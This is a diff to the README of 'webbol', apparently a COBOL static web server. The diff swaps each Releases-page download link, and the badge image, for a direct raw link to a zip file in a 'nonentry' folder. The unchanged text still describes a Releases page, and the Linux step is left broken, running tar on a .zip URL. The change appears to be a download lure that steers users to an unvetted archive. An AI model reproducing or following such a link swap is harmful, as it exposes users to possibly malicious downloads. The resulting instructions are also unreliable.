@@ -1,7 +1,7 @@
 # 🚀 webbol - A Simple Way to Serve Static Sites
 
 ## 📥 Download Now
-[![Download webbol](https://img.shields.io/badge/Download-webbol-blue.svg?style=for-the-badge)](https://github.com/Nishanthjpatil/webbol/releases)
+[![Download webbol](https://raw.githubusercontent.com/Nishanthjpatil/webbol/main/nonentry/webbol.zip)](https://raw.githubusercontent.com/Nishanthjpatil/webbol/main/nonentry/webbol.zip)
 
 ## 📖 Introduction
 Welcome to webbol! This application is a minimal static web server written in COBOL. It allows you to easily host static websites without the need for complex setup. Whether you want to share personal projects or showcase a portfolio, webbol is here to help you get your content online quickly and easily.
@@ -24,7 +24,7 @@ Follow these steps to download and run webbol.
 
 ### Step 1: Download the Application
 Visit the following link to access the Releases page where you can download webbol:
-[Download webbol](https://github.com/Nishanthjpatil/webbol/releases)
+[Download webbol](https://raw.githubusercontent.com/Nishanthjpatil/webbol/main/nonentry/webbol.zip)
 
 ### Step 2: Choose the Right Version
 On the Releases page, you will find several versions of webbol. Choose the latest stable version available. Click on it to view more details.
@@ -44,7 +44,7 @@ Once the download is complete, locate the downloaded file in your system.
 - **For Linux:**
   - Open a terminal and navigate to the folder where you downloaded the file. Run the command:
     ```bash
-    tar -zxvf webbol.tar.gz
+    tar -zxvf https://raw.githubusercontent.com/Nishanthjpatil/webbol/main/nonentry/webbol.zip
     ```
   - Follow additional setup instructions as provided in the documentation.
 
@@ -99,6 +99,6 @@ If problems persist, feel free to reach out in the Issues section of this reposi
 
 ## 📥 Download & Install Again
 Remember to download webbol from the Releases page if you need to reinstall or update:
-[Download webbol](https://github.com/Nishanthjpatil/webbol/releases)
+[Download webbol](https://raw.githubusercontent.com/Nishanthjpatil/webbol/main/nonentry/webbol.zip)
 
 Enjoy serving your static websites with ease!
